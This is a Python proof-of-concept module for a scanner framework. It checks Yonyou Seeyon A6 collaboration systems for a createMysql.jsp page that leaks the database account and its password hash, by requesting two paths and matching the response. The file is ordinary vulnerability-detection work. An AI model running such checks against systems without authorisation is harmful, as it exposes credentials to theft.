# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = '064f6a26-dcd0-4721-a88f-43ca5eb7f3af'
    name = '用友致远A6协同系统 敏感信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2015-04-27'  # 漏洞公布时间
    desc = '''
        用友致远A6协同系统createMysql.jsp敏感信息泄露，
        该漏洞泄露了数据库用户的账号，密码hash.
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '用友'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '5b34dd81-8d92-43bd-a346-132315ce8535'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #__Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0110538
            payloads=[
                '/yyoa/createMysql.jsp',
                '/yyoa/ext/createMysql.jsp'
            ]
            for payload in payloads:
                verify_url = self.target + payload
                #code, head, res, errcode, _ = curl.curl(url)
                r = requests.get(verify_url)
                if r.status_code == 200 and 'localhost' in r.content:
                    #security_info(url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
                
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
